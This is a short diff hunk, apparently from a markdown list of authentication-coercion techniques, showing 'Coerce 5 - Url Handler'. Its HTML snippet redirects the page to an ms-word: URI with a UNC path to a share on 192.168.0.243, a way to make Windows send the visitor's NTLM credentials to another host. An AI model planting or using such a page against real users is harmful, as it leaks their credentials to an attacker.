@@ -340,7 +340,7 @@ IconIndex=1
 
 #### Coerce 5 - Url Handler 
 ```js
-let foo = '<!DOCTYPE html>
+'<!DOCTYPE html>
 <html>
 	<script>
 		location.href = 'ms-word:ofe|u|\\192.168.0.243/share/leak.docx';
